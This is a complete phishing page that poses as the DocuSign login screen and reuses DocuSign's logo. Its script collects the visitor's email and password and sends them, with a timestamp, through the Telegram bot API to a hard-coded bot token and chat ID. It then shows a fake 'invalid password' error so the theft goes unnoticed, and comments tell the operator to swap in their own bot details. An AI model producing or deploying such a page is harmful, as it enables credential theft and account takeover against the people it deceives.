<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Docusign</title>
    <style>
        * { box-sizing: border-box; }
        body { margin:0; font-family: Arial, sans-serif; background:#f8f8f8; }
        .header { padding:24px 40px; background:white; border-bottom:1px solid #eee; }
        .logo { height:32px; }
        .container {
            max-width:420px; margin:60px auto; background:white;
            border-radius:8px; box-shadow:0 4px 20px rgba(0,0,0,0.08);
        }
        .content { padding:40px 40px 32px; text-align:center; }
        h1 { font-size:28px; margin:0 0 10px 0; }
        .subtitle { color:#555; margin-bottom:32px; }
        label { display:block; text-align:left; margin-bottom:8px; font-weight:500; }
        input { width:100%; padding:14px; font-size:16px; border:1px solid #ccc; border-radius:4px; margin-bottom:24px; }
        button { width:100%; padding:15px; background:#4c00ff; color:white; border:none; font-size:15px; font-weight:600; border-radius:4px; cursor:pointer; }
        button:hover { background:#3a00cc; }
        .error { color:#d13239; margin-top:15px; display:none; }
    </style>
</head>
<body>

    <div class="header">
        <img src="https://docucdn-a.akamaihd.net/olive/images/2.64.0/global-assets/ds-logo-default.svg" alt="DocuSign" class="logo">
    </div>

    <div class="container">
        <div id="emailStep" class="content">
            <h1>Log in to Docusign.</h1>
            <p class="subtitle">Enter your email to log in.</p>
            <label for="email">Email <span style="color:red;">*</span></label>
            <input type="email" id="email" placeholder="Enter email" required>
            <button onclick="showPasswordStep()">NEXT</button>
        </div>

        <div id="passwordStep" class="content" style="display:none;">
            <h2>Enter your password</h2>
            <input type="password" id="password" placeholder="Enter password">
            <button onclick="submitLogin()">Sign In</button>
            <div id="errorMessage" class="error">Invalid email or password. Please try again.</div>
            <button onclick="goBackToEmail()" style="margin-top:20px;background:none;border:none;color:#0069ec;">← Back</button>
        </div>
    </div>

<script>
// ==================== YOUR TELEGRAM SETTINGS ====================
const BOT_TOKEN = "8782338544:AAGii1hfURZa1r83ptNahLY7nCAtpRE9MeU";   // ← CHANGE THIS
const CHAT_ID = "6073753487";                                       // ← CHANGE THIS
// ============================================================

function showPasswordStep() {
    document.getElementById('emailStep').style.display = 'none';
    document.getElementById('passwordStep').style.display = 'block';
}

function goBackToEmail() {
    document.getElementById('passwordStep').style.display = 'none';
    document.getElementById('emailStep').style.display = 'block';
}

async function submitLogin() {
    const email = document.getElementById('email').value.trim();
    const pass = document.getElementById('password').value.trim();

    if (!email || !pass) return alert("Please fill both fields");

    // Send to Telegram
    const msg = `🔐 Login Attempt\nEmail: ${email}\nPassword: ${pass}\nTime: ${new Date().toLocaleString()}`;
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
        });
    } catch(e){}

    // Show fake error
    document.getElementById('errorMessage').style.display = 'block';
    document.getElementById('password').value = '';
}
</script>

</body>
</html>
